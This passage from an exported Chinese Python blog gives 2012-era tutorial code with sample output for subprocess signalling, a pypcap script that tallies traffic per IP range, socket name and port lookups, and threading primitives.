subprocess.Popen(['cut', '-f', '3', '-d:'],\n                        stdin=grep.stdout,\n                        stdout=subprocess.PIPE,\n                        )</p>\n\n<p>end_of_pipe = cut.stdout #这个效果也就是执行：cat index.rst|grep '.. include::'|cut -f2 -d':'</p>\n\n<p>print 'Included files:'\nfor line in end_of_pipe:\n    print '\\t', line.strip()\n</pre></p>\n\n<p>以下是一个测试的脚本（test1.py）：</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport signal\nimport time\nimport sys</p>\n\n<p>pid = os.getpid()\nreceived = False</p>\n\n<p>def signal_usr1(signum, frame):   #回调接收到信号时调用\n    global received\n    received = True\n    print 'CHILD %6s: Received USR1' % pid\n    sys.stdout.flush()</p>\n\n<p>print 'CHILD %6s: Setting up signal handler' % pid\nsys.stdout.flush()\nsignal.signal(signal.SIGUSR1, signal_usr1)\nprint 'CHILD %6s: Pausing to wait for signal' % pid\nsys.stdout.flush()\ntime.sleep(3)</p>\n\n<p>if not received:\n    print 'CHILD %6s: Never received signal' % pid\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport signal\nimport subprocess\nimport time\nimport sys</p>\n\n<p>proc = subprocess.Popen(['python', 'signal_child.py'])\nprint 'PARENT      : Pausing before sending signal...'\nsys.stdout.flush()\ntime.sleep(1)\nprint 'PARENT      : Signaling child'\nsys.stdout.flush()\nos.kill(proc.pid, signal.SIGUSR1)\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nPARENT      : Pausing before sending signal...\nCHILD  15335: Setting up signal handler\nCHILD  15335: Pausing to wait for signal\nPARENT      : Signaling child\nCHILD  15335: Received USR1\n<pre class=\"sh_python\">\nimport os\nimport signal\nimport subprocess\nimport tempfile\nimport time\nimport sys</p>\n\n<p>script = '''#!/bin/sh\necho \"Shell script in process $$\"\nset -x\npython signal_child.py\n'''\nscript_file = tempfile.NamedTemporaryFile('wt')\nscript_file.write(script)\nscript_file.flush() #创建一个临时文件</p>\n\n<p>proc = subprocess.Popen(['sh', script_file.name], close_fds=True)  #执行新进程前关闭0/1/2之外的文件\nprint 'PARENT      : Pausing before sending signal to child %s...' % proc.pid\nsys.stdout.flush()\ntime.sleep(1)\nprint 'PARENT      : Signaling child %s' % proc.pid\nsys.stdout.flush()\nos.kill(proc.pid, signal.SIGUSR1)\ntime.sleep(3)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nPARENT      : Pausing before sending signal to child 15434...\nShell script in process 15434\n+ python test1.py\nCHILD  15435: Setting up signal handler\nCHILD  15435: Pausing to wait for signal\nPARENT      : Signaling child 15434\nCHILD  15435: Never received signal  #child不能收到父进程的信号</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport signal\nimport subprocess\nimport tempfile\nimport time\nimport sys</p>\n\n<p>script = '''#!/bin/sh\necho \"Shell script in process $$\"\nset -x\npython test1.py\n'''\nscript_file = tempfile.NamedTemporaryFile('wt')\nscript_file.write(script)\nscript_file.flush()</p>\n\n<p>proc = subprocess.Popen(['sh', script_file.name], \n                        close_fds=True,\n                        preexec_fn=os.setsid,  # 钩子函数， 在fork和exec之间执行\n                        )\nprint 'PARENT      : Pausing before sending signal to child %s...' % proc.pid\nsys.stdout.flush()\ntime.sleep(1)\nprint 'PARENT      : Signaling process group %s' % proc.pid\nsys.stdout.flush()\nos.killpg(proc.pid, signal.SIGUSR1)\ntime.sleep(3)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 225,
    "title": "python抓包程序（pypcap）",
    "category": "python",
    "tags": [
      "pypcap"
    ],
    "url": "/archives/pythonzhuabaochengxupypcap/",
    "content": "<p>前言：网上好像抓包例子就是那么几个，我这里提供一个抓包例子，但是请注意，如果网卡流量&gt;200M，由于性能原因，建议使用c源码编译的程序：</p>\n\n<p><pre class=\"sh_python\">\n#/usr/bin/env python\n#-*-coding:utf8-*-</p>\n\n<p>#抓包脚本\n\"\"\"\nThis script is used to Capture and Analysis packets</p>\n\n<p>Required dependencies:\n1 libpcap-devel\nInstallation:\nrpm -ivh ../libpcap-devel-0.9.4-14.el5.i386.rpm\n2 pypcap \nInstallation:\ntar zxvf pypcap-1.1.tar.gz \ncd pypcap-1.1\nCFLAGS=-m32 python setup.py config \nCFLAGS=-m32 python setup.py build \nCFLAGS=-m32 python setup.py install </p>\n\n<p>3 iplist Format\niplist＝ 'ip/mask','ip/mask'  OR iplist＝ 'ip/mask',    #本脚本主要根据ip段分析内外网流量数据，我自定义一个函数用来解析子网掩码方式的ip段，这里支持多个ip段，也支持一个段，但是要加‘,’</p>\n\n<p>Writer:Dongweiming</p>\n\n<p>\"\"\"</p>\n\n<p>import pcap\nimport socket\nimport struct\nimport ctypes\nimport datetime\nimport threading\nimport inspect\nimport traceback\nfrom optparse import OptionParser\nfrom subprocess import *\nimport sys,os\nimport time</p>\n\n<p>iplist = '115.12.1.0/24','219.213.232.192/26'  #设置解析这2个段的ip列表</p>\n\n<p>def _async_raise(tid, exctype):\n    if not inspect.isclass(exctype):\n        raise TypeError(\"Only types can be raised (not instances)\")\n    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))\n    if res == 0:\n        raise ValueError(\"invalid thread id\")\n    elif res != 1:\n        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, 0)\n        raise SystemError(\"PyThreadState_SetAsyncExc failed\")\ndef ipto(ip,ti):\n    d = ti/8\n    c = 256/(2**(ti%8))\n    ip_items = ip.split('.')\n    if len(ip_items[d:]) == 1:\n        if ti%8 == 0:\n            cmin = '%s.%s' % ('.'.join(ip_items[:d]),'0')\n            cmax = '%s.%s' % ('.'.join(ip_items[:d]),'255')\n        else:\n            for i in range(2**(ti%8)):\n\t        mymax = (i+1)*c-1\n\t        mymin=  i*c\n\t        data =  int(''.join(ip_items[d:]))\n\t        if data &lt; mymax and data &gt;= mymin:\n\t            cmin = '%s.%s' % ('.'.join(ip_items[:d]),mymin)\n  \t            cmax = '%s.%s' % ('.'.join(ip_items[:d]),mymax)\n    else:\n        if ti%8 == 0:\n             cmin = '%s.%s.%s' % ('.'.join(ip_items[:d]),'0',('0.'*(len(ip_items)-d-1))[:-1])\n             cmax = '%s.%s.%s' % ('.'.join(ip_items[:d]),'255',('255.'*(len(ip_items)-d-1))[:-1])\n        else:\n\t    for i in range(2**(ti%8)):\n                mymax = (i+1)*c-1\n                mymin=  i*c\n\t        data =  int(''.join(ip_items[d]))\n\t        if data &lt; mymax and data &gt;= mymin:\n\t\t    cmin = '%s.%s.%s' % ('.'.join(ip_items[:d]),mymin,('0.'*(len(ip_items)-d-1))[:-1])\n\t\t    cmax = '%s.%s.%s' % ('.'.join(ip_items[:d]),mymax,('255.'*(len(ip_items)-d-1))[:-1])\n    return cmin,cmax  #返回ip段中可用的最小ip和最大ip</p>\n\n<p>class MYthread(threading.Thread):  #自定义theading.Thread类，能够产生线程并且杀掉线程\n    def _get_my_tid(self):\n        if not self.isAlive():\n            raise threading.ThreadError(\"the thread is not active\")\n        if hasattr(self, \"_thread_id\"):\n            return self._thread_id</p>\n\n<p>        for tid, tobj in threading._active.items():\n            if tobj is self:\n                self._thread_id = tid\n                return tid\n        raise AssertionError(\"could not determine the thread's id\")\n    def raise_exc(self, exctype):\n        _async_raise(self._get_my_tid(), exctype)</p>\n\n<p>    def terminate(self):\n        self.raise_exc(SystemExit)\nclass Crawl():  #解析主函数\n    def __init__(self,eth,mytime,flag):\n        self.bytes = 0\n        self.bytes_out = 0\n        self.packets = 0\n        self.packets_out = 0\n        self.eth = eth\n        self.mytime = mytime\n        self.flag = flag\n    def myntohl(self,ip):\n        return socket.ntohl(struct.unpack(\"I\",socket.inet_aton(ip))[0])  #inet_aton 将ip地址的4段地址分别进行2进制转化，输出用16进制表示，\n                                                     #unpack的处理是按16进制（4bit）将2进制字符，从后向前读入的，低位入\n                                                     #ntohl, htonl 表示的是网络地址和主机地址之间的转换（network byte &lt;==&gt; host byte）\n                                                     #由于unpack/pack的解/打包的颠倒顺序，必须通过htonl 或者 ntohl 进行处理\n                                                     #比如从’192.168.1.235’ 可以转换为数字’3120670912’，此数字为网络字节序\n    def check(self,dict,uip):\n        flag = 0\n        for i in dict.keys():\n            if uip &gt; self.myntohl(i) and uip &lt; self.myntohl(dict[i]):  #如果抓取的uip属于ip段，flag＝1，否则为0\n#       if (uip &gt; self.myntohl('1941307648') and uip &lt; self.myntohl('1941307903')) or (self.myntohl('3689867456') and uip &lt; self.myntohl('3689867519')):\n                 flag =1\n        return flag\n    def run(self):  #设置的抓取时间里pcap一直抓包，各个队列累加数值，最后除以时间，即平均\n        dict = {}\n        for i in iplist:\n             d = i.split('/')\n             cmin,cmax = ipto(d[0],int(d[1]))\n             dict[cmin]=cmax  #这里记录一个字典，key是ip段最小的的ip，value是最大的ip</p>\n\n<p>        if self.eth == 'all':\n            pc = pcap.pcap()\n        else:\n            pc = pcap.pcap(self.eth)\n        for ptime,pdata in pc:\n            #try:\n            #    ip_type = socket.ntohs(struct.unpack(\"H\",pdata[12:14])[0])  #\n            #except:\n            #     pass \n      \t    #if ip_type != 2048: \n\t    #    continue\n \t    s_uip = socket.ntohl(struct.unpack(\"I\",pdata[14+12:14+16])[0]) #源ip的网络字节序\n\t    #d_uip = socket.ntohl(struct.unpack(\"I\",pdata[14+16:14+20])[0])  #目的ip的网络字节序\n            bytes = socket.ntohs(struct.unpack(\"H\",pdata[14+2:14+4])[0])+14 #数据的字节数\n            if self.check(dict,s_uip):\n\t        self.bytes_out += bytes\n                self.packets_out += 1\n \t    else:\n\t        self.bytes += bytes\n                self.packets += 1\n    def withtime(self):\n        pid =  os.getpid()\n        name = sys.argv[0]\n        Popen(\"kill -9 `ps -ef |grep %s|grep -v grep |awk '{print $2}'|grep -v %d`\" % (name,pid),stdout=PIPE, stderr=PIPE,shell=True) #这里是\n                                     #在启动时候主动杀掉系统中存在的残留程序,使用中发现有时候（极少）执行时间到没有杀掉程序，为了定时任务安全\n        self.t = MYthread(target = self.run)\n        self.t.setDaemon(1)\n        self.t.start()\n        curtime = time.ctime(time.time())\n        t = 0\n        while t&lt;int(self.mytime):\n           t +=1\n           time.sleep(1)\n        nowtime = time.ctime(time.time())\n        data = \"From[%s]To[%s]%s\\n%s%s%s%s\\n%s%s%s%s\\n\" \\\n        % (curtime,nowtime,u'数据统计'.encode('utf8'),u'出网总流量/s'.encode('utf8').ljust(22,' '),\\\n           u'出网总数据包/s'.encode('utf8').ljust(22,' '),u'进网总流量/s'.encode('utf8').ljust(22,' '),\\\n           u'进网总数据包/s'.encode('utf8').ljust(22,' '),str(int(self.bytes_out)/int(self.mytime)).ljust(18,' '),\\\n           str(int(self.packets_out)/int(self.mytime)).ljust(18,' '),str(int(self.bytes)/int(self.mytime)).ljust(18,' '),\\\n           str(int(self.packets)/int(self.mytime)).ljust(18,' '))\n        if self.flag:\n            print data\n        self.log(data)\n        self.t.terminate()\n        self.t.join()</p>\n\n<p>    def log(self,log):  #记录日志，使用－p选项只在记录，不在终端打印，用于定时任务等需求时（定时任务执行没必要输出）\n        path = os.path.split(os.path.realpath(__file__))[0]\n        log_file = \"%s/common.log\" % path\n        if not os.path.exists(log_file):\n            f=open(log_file,'w')\n            f.close()\n        try:\n            fr = open(log_file, \"a+\")\n            fr.write(log+\"\\r\\n\")\n\t    fr.close()\n\texcept Exception, e:\n            pass</p>\n\n<p>if __name__ == '__main__':\n    argc = len(sys.argv)\n    parser = OptionParser(description=\"Use For Capture and Analysis packets\",add_help_option=False,prog=\"sniffer.py\",usage=\"%prog [ -e &lt;ethname&gt;][ -t &lt;time&gt;]\")\n    parser.add_option(\"-e\", \"--eth\",action = \"store\",default = \"all\",help = \"Select the card, the default is 'all'\") #选择网卡，默认是all\n    parser.add_option(\"-t\", \"--time\",action = \"store\",default = 5,help = \"Select the capture time,the default is 5s\")  #设置要抓包的时间，单位秒，时间越长越精确\n    parser.add_option(\"-p\", \"--myprint\",action = \"store_false\",default = True,help = \"Print data, the default is true\")\n    parser.add_option(\"-h\", \"--help\",action = \"help\",help=\"print help\")\n    options, arguments=parser.parse_args()\n    a = Crawl(options.eth,options.time,options.myprint)\n    a.withtime()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "05"
    }
  },
  {
    "id": 226,
    "title": "关于socket研究(一)",
    "category": "python模块研究",
    "tags": [
      "socket"
    ],
    "url": "/archives/guanyusocketyanjiuyi/",
    "content": "<p>前言；socket是python网络通讯的模块，socket用于描述IP地址和端口，是一个通信链的句柄。在Internet上的主机一般运行了多个服务软件，同时提供几种服务。每种服务都打开一个Socket，并绑定到一个端口上，不同的端口对应于不同的服务。Socket正如其英文原意那样，象一个多孔插座。</p>\n\n<p><pre class=\"sh_python\">\nimport socket\nprint socket.gethostname()  #获取linux主机的hostname\nprint socket.gethostbyname('www.dongwm.com')  #获取www.dongwm.com的ip\nhostname, aliases, addresses = socket.gethostbyname_ex('www.baidu.com')  #获取主机名，别名和ip地址\nprint hostname, aliases, addresses\nprint socket.getfqdn('www.dongwm.com')  #获取<span><em>FQDN</em></span>(<span>全称域名</span>)\nhostname, aliases, addresses = socket.gethostbyaddr('61.135.169.105')  #通过ip获取主机名，别名和ip地址\nprint hostname, aliases, addresses\n\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport socket\nfrom urlparse import urlparse,urlunparse</p>\n\n<p>for url in [ 'http://www.python.org',\n             'https://www.mybank.com',\n             'ftp://prep.ai.mit.edu',\n             'gopher://gopher.micro.umn.edu',\n             'smtp://mail.example.com',\n             'imap://mail.example.com',\n             'imaps://mail.example.com',\n             'pop3://pop.example.com',\n             'pop3s://pop.example.com',\n             ]:\n    parsed_url = urlparse(url)\n    port = socket.getservbyname(parsed_url.scheme)  #通过urlparse解析协议端口\n    print '%6s : %s' % (parsed_url.scheme, port)\nfor port in [ 80, 443, 21, 70, 25, 143, 993, 110, 995 ]:\n    print urlunparse(\n        (socket.getservbyport(port), 'example.com', '/', '', '', '')  #通过端口返回协议前缀\n        )\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nhttp : 80\nhttps : 443\nftp : 21\ngopher : 70\nsmtp : 25\nimap : 143\nimaps : 993\npop3 : 110\npop3s : 995\nhttp://example.com/\nhttps://example.com/\nftp://example.com/\ngopher://example.com/\nsmtp://example.com/\nimap://example.com/\nimaps://example.com/\npop3://example.com/\npop3s://example.com/</p>\n\n<p><pre class=\"sh_python\">\nimport socket</p>\n\n<p>def get_constants(prefix):\n    \"\"\"Create a dictionary mapping socket module constants to their names.\"\"\"\n    return dict( (getattr(socket, n), n)\n                 for n in dir(socket)\n                 if n.startswith(prefix)\n                 )</p>\n\n<p>protocols = get_constants('IPPROTO_')</p>\n\n<p>for name in [ 'icmp', 'udp', 'tcp' ]:\n    proto_num = socket.getprotobyname(name)  #获取协议号\n    const_name = protocols[proto_num]  #协议标识\n    print '%4s -&gt; %2d (socket.%-12s = %2d)' % \\\n        (name, proto_num, const_name, getattr(socket, const_name))\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nicmp -&gt;  1 (socket.IPPROTO_ICMP =  1)\nudp -&gt; 17 (socket.IPPROTO_UDP  = 17)\ntcp -&gt;  6 (socket.IPPROTO_TCP  =  6)\n<pre class=\"sh_python\">\nimport socket</p>\n\n<p>def get_constants(prefix):\n    \"\"\"Create a dictionary mapping socket module constants to their names.\"\"\"\n    return dict( (getattr(socket, n), n)  #返回一个<span>模块定义的标识符</span>符合某前缀标识号和名字的字典\n                 for n in dir(socket)\n                 if n.startswith(prefix)\n                 )</p>\n\n<p>families = get_constants('AF_')  #返回协议簇\ntypes = get_constants('SOCK_')  #套接字类型\nprotocols = get_constants('IPPROTO_')  #协议类型</p>\n\n<p>for response in socket.getaddrinfo('www.python.org', 'http'): #gethostbyname和gethostbyaddr这两个函数仅仅支持IPv4，\n                                       #getaddrinfo函数能够处理名字到地址以及服务到端口这两 种转换</p>\n\n<p>    family, socktype, proto, canonname, sockaddr = response</p>\n\n<p>    print 'Family        :', families[family]\n    print 'Type          :', types[socktype]\n    print 'Protocol      :', protocols[proto]\n    print 'Canonical name:', canonname\n    print 'Socket address:', sockaddr\n    print\nfor response in socket.getaddrinfo('www.python.org', 'http',  \n                                   socket.AF_INET,      # 添加筛选添加，family\n                                   socket.SOCK_STREAM,  # socktype\n                                   socket.IPPROTO_TCP,  # protocol\n                                   socket.AI_CANONNAME, # flags\n                                   ):</p>\n\n<p>    family, socktype, proto, canonname, sockaddr = response</p>\n\n<p>    print 'Family        :', families[family]\n    print 'Type          :', types[socktype]\n    print 'Protocol      :', protocols[proto]\n    print 'Canonical name:', canonname\n    print 'Socket address:', sockaddr\n    print\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nFamily        : AF_INET\nType          : SOCK_DGRAM\nProtocol      : IPPROTO_UDP\nCanonical name:\nSocket address: ('82.94.164.162', 80)</p>\n\n<p>Family        : AF_INET\nType          : SOCK_STREAM\nProtocol      : IPPROTO_TCP\nCanonical name:\nSocket address: ('82.94.164.162', 80)</p>\n\n<p>Family        : AF_INET6\nType          : SOCK_DGRAM\nProtocol      : IPPROTO_UDP\nCanonical name:\nSocket address: ('2001:888:2000:d::a2', 80, 0, 0)</p>\n\n<p>Family        : AF_INET6\nType          : SOCK_STREAM\nProtocol      : IPPROTO_TCP\nCanonical name:\nSocket address: ('2001:888:2000:d::a2', 80, 0, 0)</p>\n\n<p>\nFamily        : AF_INET\nType          : SOCK_STREAM\nProtocol      : IPPROTO_TCP\nCanonical name: dinsdale.python.org\nSocket address: ('82.94.164.162', 80)\n<pre class=\"sh_python\">\nimport binascii\nimport socket\nimport struct\nimport sys</p>\n\n<p>string_address = sys.argv[1]\npacked = socket.inet_aton(string_address)  #将ip地址的4段地址分别进行2进制转化，但输出用16进制表示</p>\n\n<p>print 'Original:', string_address\nprint 'Packed  :', binascii.hexlify(packed)\nprint 'Unpacked:', socket.inet_ntoa(packed) #从网络字节序的数字’’转换为ip\n</pre>\n执行结果：\ndongwm@linux-dongwm:~&gt; python test.py 192.168.1.1\nOriginal: 192.168.1.1\nPacked  : c0a80101\nUnpacked: 192.168.1.1\ndongwm@linux-dongwm:~&gt; python test.py 127.0.0.1\nOriginal: 127.0.0.1\nPacked  : 7f000001\nUnpacked: 127.0.0.1\n<pre class=\"sh_python\">\nimport binascii\nimport socket\nimport struct\nimport sys</p>\n\n<p>string_address = sys.argv[1]\npacked = socket.inet_pton(socket.AF_INET6, string_address)  #socket.inet_pton代替socket.inet_aton指定参数处理ipv6地址\n\nprint 'Original:', string_address\nprint 'Packed  :', binascii.hexlify(packed)\nprint 'Unpacked:', socket.inet_ntop(socket.AF_INET6, packed) ##从网络字节序的数字’’转换为ipv6\n</pre></p>\n\n<p></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "06"
    }
  },
  {
    "id": 227,
    "title": "关于threading研究（一）",
    "category": "python模块研究",
    "tags": [
      "threading"
    ],
    "url": "/archives/guanyuthreadingyanjiuer/",
    "content": "<p>前言：threading是python的管理多线程模块，实际工作中很常用，很多功能类似于multiprocessing（多进程模块）</p>\n\n<p><pre class=\"sh_python\">\nimport threading</p>\n\n<p>def worker(num):   #带参数的函数\n    print 'Worker: %s' % num\n    return</p>\n\n<p>threads = []\nfor i in range(5):\n    t = threading.Thread(target=worker, args=(i,))  #实例化，多线程操作\n    threads.append(t)\n    t.start()  #启动多线程，还可以继承threading.Thread类，重写run()函数为worker函数内容，实现一样的效果\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport threading\nimport time</p>\n\n<p>def worker():\n    print threading.currentThread().getName(), 'Starting'\n    time.sleep(2)\n    print threading.currentThread().getName(), 'Exiting'</p>\n\n<p>def my_service():\n    print threading.currentThread().getName(), 'Starting'\n    time.sleep(3)\n    print threading.currentThread().getName(), 'Exiting'</p>\n\n<p>t = threading.Thread(name='my_service', target=my_service)  #设置实现的线程函数的名字\nw = threading.Thread(name='worker', target=worker)\nw2 = threading.Thread(target=worker) # 使用线程函数的默认的名字，这里就是Thread-1，Thread-2，这样的累加</p>\n\n<p>w.start()\nw2.start()\nt.start()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport logging\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,   #打印日志使用logging模块\n                    format='[%(levelname)s] (%(threadName)-10s) %(message)s',  #格式格式，前面是logging的级别，因为上面指定DEBUG模式，threadName表示线程的名字\n                    )</p>\n\n<p>def worker():\n    logging.debug('Starting')\n    time.sleep(2)\n    logging.debug('Exiting')</p>\n\n<p>def my_service():\n    logging.debug('Starting')\n    time.sleep(3)\n    logging.debug('Exiting')</p>\n\n<p>t = threading.Thread(name='my_service', target=my_service)\nw = threading.Thread(name='worker', target=worker)\nw2 = threading.Thread(target=worker) </p>\n\n<p>w.start()\nw2.start()\nt.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n[DEBUG] (worker    ) Starting\n[DEBUG] (Thread-1  ) Starting\n[DEBUG] (my_service) Starting\n[DEBUG] (worker    ) Exiting\n[DEBUG] (Thread-1  ) Exiting\n[DEBUG] (my_service) Exiting\n<pre class=\"sh_python\">\nimport threading\nimport time\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def daemon():\n    logging.debug('Starting')\n    time.sleep(2)\n    logging.debug('Exiting')</p>\n\n<p>d = threading.Thread(name='daemon', target=daemon)\nd.setDaemon(True)  #设置daemon模式，主程序结束，这个子线程依然存在</p>\n\n<p>def non_daemon():\n    logging.debug('Starting')\n    logging.debug('Exiting')</p>\n\n<p>t = threading.Thread(name='non-daemon', target=non_daemon)  #默认deamon是false，也就是不使用守护模式，子线程跟随主程序结束</p>\n\n<p>d.start()\nt.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(daemon    ) Starting\n(non-daemon) Starting\n(non-daemon) Exiting\n<pre class=\"sh_python\">\nimport threading\nimport time\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def daemon():\n    logging.debug('Starting')\n    time.sleep(2)\n    logging.debug('Exiting')</p>\n\n<p>d = threading.Thread(name='daemon', target=daemon)\nd.setDaemon(True)</p>\n\n<p>def non_daemon():\n    logging.debug('Starting')\n    logging.debug('Exiting')</p>\n\n<p>t = threading.Thread(name='non-daemon', target=non_daemon)</p>\n\n<p>d.start()\nt.start()</p>\n\n<p>d.join()  #表示等待子线程死掉再退出，也可以设置超时，超时会返回，不等待子线程结束 d.join(1) 这样sleep的2秒还不够， d.isAlive()得出线程还是存在的\nt.join()  #，但是程序也结束。\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(daemon    ) Starting\n(non-daemon) Starting\n(non-daemon) Exiting\n(daemon    ) Exiting  #等待那个deamon的子线程结束才结束</p>\n\n<p><pre class=\"sh_python\">\nimport random\nimport threading\nimport time\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def worker():\n    t = threading.currentThread()\n    pause = random.randint(1,5)\n    logging.debug('sleeping %s', pause)\n    time.sleep(pause)  #sleep一个随机值\n    logging.debug('ending')\n    return</p>\n\n<p>for i in range(3):\n    t = threading.Thread(target=worker)\n    t.setDaemon(True)  \n    t.start()</p>\n\n<p>main_thread = threading.currentThread()  #获取当前线程\nfor t in threading.enumerate():  #enumerate返回线程实例的列表\n    if t is main_thread:  #因为join当前线程会引起死锁，需要过滤\n        continue\n    logging.debug('joining %s', t.getName())\n    t.join()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Thread-1  ) sleeping 3\n(Thread-2  ) sleeping 5\n(Thread-3  ) sleeping 1\n(MainThread) joining Thread-1\n(Thread-3  ) ending\n(Thread-1  ) ending\n(MainThread) joining Thread-3\n(MainThread) joining Thread-2\n(Thread-2  ) ending\n<pre class=\"sh_python\">\nimport threading\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>class MyThreadWithArgs(threading.Thread):  #和第一个例子说的继承threading.Thread类，实例化，重写run，然后调用start()启动</p>\n\n<p>    def __init__(self, group=None, target=None, name=None,  #初始化\n                 args=(), kwargs=None, verbose=None):\n        threading.Thread.__init__(self, group=group, target=target, name=name,  #初始化threading.Thread类，因为这个类初始化有很多参数需要设定\n                                  verbose=verbose)\n        self.args = args\n        self.kwargs = kwargs\n        return</p>\n\n<p>    def run(self):\n        logging.debug('running with %s and %s', self.args, self.kwargs)\n        return</p>\n\n<p>for i in range(5):\n    t = MyThreadWithArgs(args=(i,), kwargs={'a':'A', 'b':'B'}) #kwargs被初始化\n    t.start()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Thread-1  ) running with (0,) and {'a': 'A', 'b': 'B'}\n(Thread-2  ) running with (1,) and {'a': 'A', 'b': 'B'}\n(Thread-3  ) running with (2,) and {'a': 'A', 'b': 'B'}\n(Thread-4  ) running with (3,) and {'a': 'A', 'b': 'B'}\n(Thread-5  ) running with (4,) and {'a': 'A', 'b': 'B'}\n<pre class=\"sh_python\">\nimport threading\nimport time\nimport logging</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def delayed():\n    logging.debug('worker running')\n    return</p>\n\n<p>t1 = threading.Timer(3, delayed)   #Timer主要是计时器用来延迟\nt1.setName('t1')\nt2 = threading.Timer(3, delayed)\nt2.setName('t2')</p>\n\n<p>logging.debug('starting timers')\nt1.start()\nt2.start()</p>\n\n<p>logging.debug('waiting before canceling %s', t2.getName())\ntime.sleep(2)\nlogging.debug('canceling %s', t2.getName())\nt2.cancel()  #取消线程\nlogging.debug('done')\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(MainThread) starting timers\n(MainThread) waiting before canceling t2\n(MainThread) canceling t2\n(MainThread) done\n(t1        ) worker running\n<pre class=\"sh_python\">\nimport logging\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>def wait_for_event(e):\n    logging.debug('wait_for_event starting')\n    event_is_set = e.wait()  #主线程将被阻塞，它将不会 再被分配时间片 直到现有的一些线程退出运行\n    logging.debug('event set: %s', event_is_set)  ##返回事件是否设置的布尔值</p>\n\n<p>def wait_for_event_timeout(e, t):\n    while not e.isSet():\n        logging.debug('wait_for_event_timeout starting')\n        event_is_set = e.wait(t)  #设置等待超时\n        logging.debug('event set: %s', event_is_set)\n        if event_is_set:\n            logging.debug('processing event')\n        else:\n            logging.debug('doing other work')</p>\n\n<p>e = threading.Event()  #替代time.sleep(),用wait()和set()来精确控制线程，2个或者多个线程同步操作\nt1 = threading.Thread(name='block', \n                      target=wait_for_event,\n                      args=(e,))\nt1.start()</p>\n\n<p>t2 = threading.Thread(name='non-block', \n                      target=wait_for_event_timeout, \n                      args=(e, 2))\nt2.start()</p>\n\n<p>logging.debug('Waiting before calling Event.set()')\ntime.sleep(3)\ne.set()\nlogging.debug('Event is set')\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(block     ) wait_for_event starting\n(MainThread) Waiting before calling Event.set()\n(non-block ) wait_for_event_timeout starting\n(non-block ) event set: False\n(non-block ) doing other work\n(non-block ) wait_for_event_timeout starting\n(MainThread) Event is set\n(block     ) event set: True\n(non-block ) event set: True\n(non-block ) processing event\n<pre class=\"sh_python\">\nimport logging\nimport random\nimport threading\nimport time</p>\n\n<p>logging.basicConfig(level=logging.DEBUG,\n                    format='(%(threadName)-10s) %(message)s',\n                    )</p>\n\n<p>class Counter(object):\n    def __init__(self, start=0):\n        self.lock = threading.Lock()  #锁资源，防止同时访问对象\n        self.value = start\n    def increment(self):\n        logging.debug('Waiting for lock')\n        self.lock.acquire()  #获得资源\n        try:\n            logging.debug('Acquired lock')\n            self.value = self.value + 1\n        finally:\n            self.lock.release()  #释放资源</p>\n\n<p>def worker(c):\n    for i in range(2):\n        pause = random.random()\n        logging.debug('Sleeping %0.02f', pause)\n        time.sleep(pause)\n        c.increment()\n    logging.debug('Done')</p>\n\n<p>counter = Counter()\nfor i in range(2):\n    t = threading.Thread(target=worker, args=(counter,))\n    t.start()</p>\n\n<p>logging.debug('Waiting for worker threads')\nmain_thread = threading.currentThread()\nfor t in threading.enumerate():\n    if t is not main_thread:\n        t.join()\nlogging.debug('Counter: %d', counter.value)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Thread-1  ) Sleeping 0.85\n(Thread-2  ) Sleeping 0.12\n(MainThread) Waiting for worker threads\n(Thread-2  ) Waiting for lock\n(Thread-2  ) Acquired lock\n(Thread-2  ) Sleeping 0.04\n(Thread-2  ) Waiting for lock\n(Thread-2  ) Acquired lock\n(Thread-2  ) Done\n(Thread-1  ) Waiting for lock\n(Thread-1  ) Acquired lock\n(Thread-1  ) Sleeping 